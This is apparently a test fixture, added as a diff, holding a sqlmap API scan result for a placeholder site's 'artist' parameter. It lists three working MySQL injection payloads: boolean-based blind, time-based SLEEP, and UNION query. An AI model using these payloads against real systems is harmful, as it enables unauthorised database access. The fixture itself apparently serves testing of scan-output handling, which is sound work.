@@ -1,0 +1,61 @@
+{
+  "success": true,
+  "data": [
+    {
+      "status": 1,
+      "type": 0,
+      "type_name": "TARGET",
+      "value": { "url": "http://vuln.test/artists.php", "query": "artist=1", "data": null }
+    },
+    {
+      "status": 1,
+      "type": 1,
+      "type_name": "TECHNIQUES",
+      "value": [
+        {
+          "place": "GET",
+          "parameter": "artist",
+          "dbms": "MySQL",
+          "dbms_version": [">= 5.0.12"],
+          "os": null,
+          "data": [
+            {
+              "technique": "boolean-based blind",
+              "title": "AND boolean-based blind - WHERE or HAVING clause",
+              "payload": "artist=1 AND 5757=5757",
+              "vector": "AND [INFERENCE]",
+              "comment": ""
+            },
+            {
+              "technique": "time-based blind",
+              "title": "MySQL >= 5.0.12 AND time-based blind (query SLEEP)",
+              "payload": "artist=1 AND (SELECT 4321 FROM (SELECT(SLEEP(5)))abc)",
+              "vector": "AND [RANDNUM]=IF(...)",
+              "comment": ""
+            },
+            {
+              "technique": "UNION query",
+              "title": "Generic UNION query (NULL) - 3 columns",
+              "payload": "artist=-1 UNION ALL SELECT NULL,NULL,CONCAT(0x71,0x62,0x71)",
+              "vector": "UNION ALL SELECT NULL,NULL,[QUERY]",
+              "comment": ""
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "status": 1,
+      "type": 2,
+      "type_name": "DBMS_FINGERPRINT",
+      "value": "back-end DBMS: MySQL >= 5.0.12"
+    }
+  ],
+  "error": [],
+  "meta": {
+    "api_version": 2,
+    "sqlmap_version": "sqlmap/1.10.7#stable",
+    "url": "http://vuln.test/artists.php",
+    "timestamp": "2026-07-02 12:00:00"
+  }
+}
